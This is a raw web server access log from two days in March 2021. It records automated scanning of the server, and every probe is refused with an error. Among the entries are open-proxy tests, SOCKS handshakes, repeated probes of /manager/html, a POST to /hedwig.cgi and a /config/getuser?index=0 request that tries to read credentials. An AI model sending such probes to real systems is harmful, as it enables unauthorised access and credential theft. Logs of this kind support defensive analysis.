162.142.125.55 - - [30/Mar/2021:11:26:10 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
85.119.151.252 - - [30/Mar/2021:11:26:10 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPNIRVNODVRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
85.119.151.253 - - [30/Mar/2021:11:26:15 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.251 - - [30/Mar/2021:11:26:20 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.252 - - [30/Mar/2021:11:26:25 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.56.172 - - [30/Mar/2021:11:55:52 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
205.185.127.244 - - [30/Mar/2021:12:14:08 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.62.143 - - [30/Mar/2021:13:32:28 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [30/Mar/2021:14:10:57 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
184.105.247.194 - - [30/Mar/2021:14:29:46 +0000] "GET / HTTP/1.1" 404 2596 "-" "-"
192.241.217.222 - - [30/Mar/2021:14:36:21 +0000] "GET /hudson HTTP/1.1" 404 1049 "-" "Mozilla/5.0 zgrab/0.x"
85.119.151.252 - - [30/Mar/2021:14:47:55 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUIEMNYBIRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.119.151.253 - - [30/Mar/2021:14:47:59 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.253 - - [30/Mar/2021:14:48:04 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.251 - - [30/Mar/2021:14:48:10 +0000] "\x05\x01\x00" 400 157 "-" "-"
85.119.151.251 - - [30/Mar/2021:14:48:49 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPDPENOKBIRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
85.119.151.254 - - [30/Mar/2021:14:48:54 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.254 - - [30/Mar/2021:14:48:59 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.251 - - [30/Mar/2021:14:49:04 +0000] "\x05\x01\x00" 400 157 "-" "-"
49.212.157.242 - - [30/Mar/2021:14:49:31 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 zgrab/0.x"
209.141.62.143 - - [30/Mar/2021:14:52:55 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [30/Mar/2021:15:40:22 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [30/Mar/2021:15:43:46 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.49.42 - - [30/Mar/2021:17:44:35 +0000] "GET /script HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [30/Mar/2021:17:44:54 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
42.51.15.86 - - [30/Mar/2021:17:46:51 +0000] "HEAD / HTTP/1.1" 404 0 "-" "-"
42.51.15.86 - - [30/Mar/2021:17:46:57 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
85.119.151.251 - - [30/Mar/2021:17:50:48 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPBKDKEYUTRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 YaBrowser/20.9.2.80 Yowser/2.5 Safari/537.36"
85.119.151.250 - - [30/Mar/2021:17:50:52 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.252 - - [30/Mar/2021:17:50:57 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.250 - - [30/Mar/2021:17:51:03 +0000] "\x05\x01\x00" 400 157 "-" "-"
85.119.151.253 - - [30/Mar/2021:17:58:21 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPBPIVIINTRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 YaBrowser/20.9.2.80 Yowser/2.5 Safari/537.36"
85.119.151.254 - - [30/Mar/2021:17:58:25 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.250 - - [30/Mar/2021:17:58:31 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.251 - - [30/Mar/2021:17:58:36 +0000] "\x05\x01\x00" 400 157 "-" "-"
185.232.69.2 - - [30/Mar/2021:18:05:10 +0000] "GET /tree? HTTP/1.1" 404 1048 "-" "Mozilla/5.0 zgrab/0.x"
5.178.86.78 - - [30/Mar/2021:20:49:10 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPBOBNEPNPRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15"
5.178.86.74 - - [30/Mar/2021:20:49:14 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [30/Mar/2021:20:49:20 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [30/Mar/2021:20:49:25 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.76 - - [30/Mar/2021:20:51:32 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPOKBIXMNPRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
5.178.86.78 - - [30/Mar/2021:20:51:36 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [30/Mar/2021:20:51:41 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.78 - - [30/Mar/2021:20:51:46 +0000] "\x05\x01\x00" 400 157 "-" "-"
172.104.242.173 - - [30/Mar/2021:21:03:31 +0000] "\xBA\xABd\xA1EZC\xDBM\x87\xEE^\xFD\xBF\x159 X\xD4>\x12\x98\xC4<\xE0\x13\xCF\x00\xAC\xA09\xD7\x90#8~\x8C\xDE\x9DReF\xBF%1Q\xE0\x9D\x06&g\xBB\x82\x95\x19\xED\x07\x14\x19ZP\x80+\x94e\xC3\xE6\x85\x06\xA4\x99\x8B\x19l\x01\xEA\x88Y\x91\x16\x95\xC4\xC8\x0EH\x02\xC7\x93g\xC14FW\x05|\xFB\xF3T\xB8\xFD\xCB\xBB)\xE3\xCE\xDD\xCD7\x9E\xEFP\x8C\xA4[V\xFD\x98\xC9l\x82\xF5\xE4\xC1d\x87X\xF7\x9B\xBF\xE8q\x12\x99&\xDB,\xF5\x87\xD7\xA8\x97j;\xE3\xEA\xA7\xB4\xB0\x02\xAD\x8DE\x9B\xAAB\x80\x0E)\xA9\xE9\xAF}\x18\x8E\xB8\x1E\x99\x04\xEF\xA8\x8C\xE8\x04\xE2\xD3\xED)1\x91\xC1\x8F\x88\x8C\x81\xF0\xDB\xA5\x88\x95H\x9BZ\xAB\xCE\xBF\xF4E%P*\x88KFY6\x9E\xE7::j\xD4\x8A\xA8V\x9A\xAA\xAB\xAF\xC3&.\xED[\x04\xC5e\x7F\x08\xBE\x8Ar\xA7\xB0\x99F\xF7\x11\xE5\xD6\x96\x8CIm+w\x1C\xFDuU\x14\x0F!x\xAC\xE8MPy\xC3\x19!2\xA0\xED\xC0}!Rw\x14\x8E\x1B\xC4\xE1\xA0\xAF+\xADKk\xC5\xE0\x5Cs\x9C\xBD\xCB" 400 157 "-" "-"
209.141.62.143 - - [30/Mar/2021:21:37:38 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
193.27.13.181 - - [30/Mar/2021:21:40:50 +0000] "CONNECT api.ipify.org:443 HTTP/1.1" 400 157 "-" "-"
193.27.13.181 - - [30/Mar/2021:21:40:50 +0000] "\x05\x01\x00" 400 157 "-" "-"
193.27.13.181 - - [30/Mar/2021:21:40:52 +0000] "\x04\x01\x01\xBB2\x13\xFC$\x00" 400 157 "-" "-"
193.27.13.181 - - [30/Mar/2021:21:46:17 +0000] "CONNECT api.ipify.org:443 HTTP/1.1" 400 157 "-" "-"
193.27.13.181 - - [30/Mar/2021:21:46:18 +0000] "\x05\x01\x00" 400 157 "-" "-"
193.27.13.181 - - [30/Mar/2021:21:46:21 +0000] "\x04\x01\x01\xBB6\xE1\x9D\xE6\x00" 400 157 "-" "-"
23.95.222.129 - - [30/Mar/2021:21:58:45 +0000] "\x16\x03\x01\x01\xFA\x01\x00\x01\xF6\x03\x03LM\xD8\xE4\xA4\x89\x1E0>\xC2>\x92\x1C=t\xBEb-i\xDF>\xF9\x11\x99\x00G\xFE\x0F\x91\xDF4\x0B\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
162.142.125.40 - - [30/Mar/2021:22:21:34 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
162.142.125.40 - - [30/Mar/2021:22:21:35 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.17.97.50 - - [30/Mar/2021:22:43:26 +0000] "GET / HTTP/1.1" 404 2601 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
209.141.62.143 - - [30/Mar/2021:22:54:13 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [30/Mar/2021:23:48:18 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPNPBKXVJMRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 YaBrowser/20.9.2.80 Yowser/2.5 Safari/537.36"
5.178.86.76 - - [30/Mar/2021:23:48:22 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [30/Mar/2021:23:48:27 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [30/Mar/2021:23:48:33 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.74 - - [30/Mar/2021:23:52:59 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUPUUNPJMRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
5.178.86.74 - - [30/Mar/2021:23:53:04 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [30/Mar/2021:23:53:09 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [30/Mar/2021:23:53:14 +0000] "\x05\x01\x00" 400 157 "-" "-"
74.82.47.5 - - [31/Mar/2021:00:05:59 +0000] "GET / HTTP/1.1" 404 2596 "-" "-"
209.141.62.143 - - [31/Mar/2021:00:15:31 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [31/Mar/2021:02:27:14 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:02:49:25 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPINJOUNJORKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
5.178.86.76 - - [31/Mar/2021:02:49:30 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [31/Mar/2021:02:49:35 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [31/Mar/2021:02:49:40 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:02:51:32 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPBPUIXVXORKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
5.178.86.78 - - [31/Mar/2021:02:51:37 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [31/Mar/2021:02:51:42 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:02:51:47 +0000] "\x05\x01\x00" 400 157 "-" "-"
89.40.73.233 - - [31/Mar/2021:02:53:19 +0000] "\x16\x03\x03\x00\x99\x01\x00\x00\x95\x03\x03`c\xE4v{Wz\xF7\x01&rX?\x015\xDC" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:03:04:11 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
74.120.14.55 - - [31/Mar/2021:03:25:22 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
74.120.14.55 - - [31/Mar/2021:03:25:23 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.141.62.143 - - [31/Mar/2021:03:47:42 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:04:31:31 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
193.46.254.25 - - [31/Mar/2021:04:58:33 +0000] "GET / HTTP/1.1" 404 2601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
209.17.96.42 - - [31/Mar/2021:05:08:19 +0000] "GET / HTTP/1.0" 404 2599 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
209.141.62.143 - - [31/Mar/2021:05:23:40 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [31/Mar/2021:05:50:05 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPENUPIUXYRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
5.178.86.78 - - [31/Mar/2021:05:50:08 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:05:50:19 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [31/Mar/2021:05:50:21 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.74 - - [31/Mar/2021:05:58:08 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPONDUJTIKRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
5.178.86.78 - - [31/Mar/2021:05:58:14 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [31/Mar/2021:05:58:18 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [31/Mar/2021:05:58:24 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.56.172 - - [31/Mar/2021:06:04:24 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:07:15:58 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
186.74.32.246 - - [31/Mar/2021:07:44:54 +0000] "GET / HTTP/1.1" 404 2596 "-" "Opera/9.80 (Windows NT 5.2) Presto/2.12.388 Version/12.14"
186.74.32.246 - - [31/Mar/2021:07:44:54 +0000] "POST /hedwig.cgi HTTP/1.1" 404 1049 "-" "-"
186.74.32.246 - - [31/Mar/2021:07:44:55 +0000] "GET /abcdTest/ HTTP/1.1" 404 2641 "-" "-"
5.178.86.76 - - [31/Mar/2021:08:49:07 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPXPEKEOIURKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
5.178.86.74 - - [31/Mar/2021:08:49:13 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [31/Mar/2021:08:49:18 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:08:49:23 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.74 - - [31/Mar/2021:08:51:31 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPNNEIXYIURKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
5.178.86.74 - - [31/Mar/2021:08:51:36 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:08:51:41 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.78 - - [31/Mar/2021:08:51:46 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:09:32:53 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [31/Mar/2021:09:50:00 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:11:08:25 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:11:51:09 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPEPUUUMRNRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
5.178.86.74 - - [31/Mar/2021:11:51:14 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [31/Mar/2021:11:51:19 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.78 - - [31/Mar/2021:11:51:24 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:12:09:09 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPOOUUEOONRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
5.178.86.74 - - [31/Mar/2021:12:09:14 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:12:09:19 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:12:09:24 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:12:27:37 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
205.185.122.102 - - [31/Mar/2021:13:18:48 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.56.172 - - [31/Mar/2021:13:35:53 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:13:42:31 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:14:24:07 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:15:04:39 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:15:53:46 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPIIXOOVUVOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
5.178.86.78 - - [31/Mar/2021:15:53:50 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [31/Mar/2021:15:53:55 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:15:54:00 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:15:56:53 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPOIXTRTUVOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
5.178.86.74 - - [31/Mar/2021:15:56:58 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [31/Mar/2021:15:57:03 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:15:57:08 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:16:39:20 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
61.219.11.153 - - [31/Mar/2021:16:59:46 +0000] "\x01\x00\x00\x00" 400 157 "-" "-"
209.141.56.172 - - [31/Mar/2021:17:16:24 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
139.162.111.98 - - [31/Mar/2021:17:20:00 +0000] "GET / HTTP/1.1" 404 2601 "-" "HTTP Banner Detection (https://security.ipip.net)"
213.25.203.130 - - [31/Mar/2021:17:43:45 +0000] "\x80t\x01\x03\x01\x00K\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:19:22:42 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
205.185.127.244 - - [31/Mar/2021:19:38:51 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
5.178.86.78 - - [31/Mar/2021:19:48:52 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPRNNTDIITOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
5.178.86.74 - - [31/Mar/2021:19:48:57 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [31/Mar/2021:19:49:02 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:19:49:07 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.78 - - [31/Mar/2021:19:53:01 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPDOXVJPITOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
5.178.86.74 - - [31/Mar/2021:19:53:06 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [31/Mar/2021:19:53:11 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:19:53:16 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:20:57:52 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [31/Mar/2021:21:00:38 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
205.185.122.102 - - [31/Mar/2021:21:00:49 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
23.95.222.129 - - [31/Mar/2021:21:31:15 +0000] "\x16\x03\x01\x01\xFA\x01\x00\x01\xF6\x03\x03|[\x8D\x01\xC1\x16i\xF4\xEAy\xE7\x05\xBA<\xF5J\x07\xC69\xBE\xA2\x1F\x93~\x06^\xF4\xA5~\x0CJ2\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:22:13:15 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
162.142.125.37 - - [31/Mar/2021:22:15:22 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
162.142.125.37 - - [31/Mar/2021:22:15:23 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.17.96.42 - - [31/Mar/2021:22:38:15 +0000] "GET / HTTP/1.1" 404 2601 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
64.227.99.233 - - [31/Mar/2021:22:40:55 +0000] "\x00\x0E8\x12\x1F\xE1n\xD6\x9E\xB0\xA2\x00\x00\x00\x00\x00" 400 157 "-" "-"
108.61.127.127 - - [31/Mar/2021:22:44:59 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36"
209.141.49.42 - - [31/Mar/2021:23:28:44 +0000] "GET /script HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [31/Mar/2021:23:33:53 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:23:50:01 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPIORIIYEPOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
5.178.86.78 - - [31/Mar/2021:23:50:06 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [31/Mar/2021:23:50:11 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [31/Mar/2021:23:50:16 +0000] "\x05\x01\x00" 400 157 "-" "-"
213.217.0.184 - - [31/Mar/2021:23:54:54 +0000] "GET / HTTP/1.1" 404 1034 "-" "python-requests/2.24.0"
